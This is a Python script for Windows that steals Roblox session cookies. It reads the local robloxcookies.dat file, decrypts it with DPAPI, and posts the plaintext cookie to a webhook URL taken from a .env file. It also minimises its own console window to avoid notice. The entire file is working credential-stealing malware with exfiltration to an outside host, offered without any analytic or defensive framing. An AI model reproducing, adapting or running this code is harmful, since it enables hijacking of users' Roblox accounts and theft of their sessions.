import os
import shutil
import json
import base64
import win32crypt
import requests
import win32gui
import win32con
from datetime import datetime, timezone
from time import time as __, sleep as zzz
from dotenv import load_dotenv

# Find Desktop directory and locate Roblox Tools/edit file/.env
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
env_path = None
for root, dirs, _ in os.walk(desktop_path):
    if "Roblox Tools" in dirs:
        env_path = os.path.join(root, "Roblox Tools", "edit file in this folder", ".env")
        break

# Fallback to .env in script's current directory
fallback_env_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env")

if env_path and os.path.exists(env_path):
    load_dotenv(env_path)
elif os.path.exists(fallback_env_path):
    load_dotenv(fallback_env_path)
else:
    print(f"[{datetime.fromtimestamp(__(), timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}] → Error: .env file not found in Roblox Tools/edit file in this folder/ on Desktop or in {fallback_env_path}")

# Get webhook URL from environment variable
WEBHOOK_URL = os.getenv("WEBHOOK_URL_GRABBER")

def log(text, sleep=None):
    print(f"[{datetime.fromtimestamp(__(), timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}] → {text}")
    if sleep: zzz(sleep)

def send_webhook(content):
    if not WEBHOOK_URL:
        log("Error: WEBHOOK_URL_GRABBER not set in .env file")
        return
    embed = {
        "title": "Decrypted Roblox Cookies",
        "description": f"```{content}```",
        "color": 0x38d13b
    }
    data = {"embeds": [embed]}
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        log(f"Webhook sent, status: {response.status_code}")
        if response.status_code != 204:
            log(f"Webhook failed: {response.text}")
    except Exception as e:
        log(f"Webhook error: {str(e)}")

def minimize_console():
    # Minimize the console window
    hwnd = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)

def retrieve_roblox_cookies():
    # Minimize the console immediately
    minimize_console()

    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")

    if not os.path.exists(roblox_cookies_path):
        log(f"Cookie file not found at {roblox_cookies_path}")
        embed = {
            "title": ":x: Cookie File Not Found",
            "description": f"Could not find robloxcookies.dat at {roblox_cookies_path}",
            "color": 0xFF0000
        }
        send_webhook(embed)
        return

    temp_dir = os.getenv("TEMP", "")
    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
    shutil.copy(roblox_cookies_path, destination_path)

    with open(destination_path, 'r', encoding='utf-8') as file:
        try:
            file_content = json.load(file)
            encoded_cookies = file_content.get("CookiesData", "")
            
            if encoded_cookies:
                decoded_cookies = base64.b64decode(encoded_cookies)
                try:
                    decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
                    cookie_string = decrypted_cookies.decode('utf-8', errors='ignore')
                    log("Decrypted cookie string retrieved.")
                    print("Decrypted Content:")
                    print(cookie_string)
                    send_webhook(cookie_string)
                except Exception as e:
                    log(f"Error decrypting with DPAPI: {e}")
                    embed = {
                        "title": ":x: Decryption Error",
                        "description": f"Failed to decrypt cookie data: {str(e)}",
                        "color": 0xFF0000
                    }
                    send_webhook(embed)
            else:
                log("Error: No 'CookiesData' found in the file.")
                embed = {
                    "title": ":x: No Cookies Data",
                    "description": "No 'CookiesData' found in robloxcookies.dat.",
                    "color": 0xFF0000
                }
                send_webhook(embed)
        
        except json.JSONDecodeError as e:
            log(f"Error while parsing JSON: {e}")
            embed = {
                "title": ":x: JSON Parse Error",
                "description": f"Failed to parse robloxcookies.dat: {str(e)}",
                "color": 0xFF0000
            }
            send_webhook(embed)
        except Exception as e:
            log(f"Error: {e}")
            embed = {
                "title": ":x: Error",
                "description": f"An error occurred: {str(e)}",
                "color": 0xFF0000
            }
            send_webhook(embed)

if __name__ == "__main__":
    retrieve_roblox_cookies()